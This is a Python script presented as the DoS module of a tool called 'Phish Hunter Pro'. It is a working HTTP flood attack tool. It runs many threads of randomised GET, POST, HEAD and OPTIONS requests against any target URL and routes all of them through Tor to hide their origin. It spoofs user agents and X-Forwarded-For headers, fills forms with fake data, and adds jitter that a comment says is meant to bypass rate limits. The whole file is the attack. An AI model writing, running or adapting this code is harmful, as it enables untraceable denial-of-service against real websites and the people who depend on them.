#!/usr/bin/env python3
"""
Phish Hunter Pro - DoS Module (Tor-Powered, Multi-Protocol)
"""

import threading
import requests
import random
import time
from faker import Faker
from requests.exceptions import RequestException

fake = Faker()

methods = ["GET", "POST", "HEAD", "OPTIONS"]

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "curl/8.1.2", "Wget/1.21.3", "Python-requests/2.31"
]

#  Tor SOCKS5 proxy
PROXIES = {
    'http': 'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050'
}

def generate_headers():
    return {
        "User-Agent": random.choice(user_agents),
        "Referer": fake.uri(),
        "X-Forwarded-For": fake.ipv4(),
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded"
    }

def generate_data():
    return {
        "firstname": fake.first_name(),
        "lastname": fake.last_name(),
        "email": fake.email(),
        "subject": fake.catch_phrase(),
        "message": fake.text(max_nb_chars=300)
    }

def flood(target):
    while True:
        try:
            method = random.choice(methods)
            headers = generate_headers()
            if method == "POST":
                data = generate_data()
                requests.post(target, data=data, headers=headers, proxies=PROXIES, timeout=8)
            elif method == "GET":
                requests.get(target, headers=headers, params=generate_data(), proxies=PROXIES, timeout=8)
            else:
                requests.request(method, target, headers=headers, proxies=PROXIES, timeout=8)
            print(f"[⚔️] {method} → {target} via Tor")
        except RequestException as e:
            print(f"[!] Tor Request failed: {e}")
        time.sleep(random.uniform(0.1, 0.4))  # jitter to bypass rate-limit

def start_dos(target, threads):
    print(f"\n Launching Tor-cloaked DoS on {target} with {threads} threads...\n")
    print(" All traffic is routed through Tor (127.0.0.1:9050)")
    print("Tip: Make sure Tor is running using: sudo service tor start")
    for _ in range(threads):
        t = threading.Thread(target=flood, args=(target,))
        t.daemon = True
        t.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] DoS stopped by user.\n")

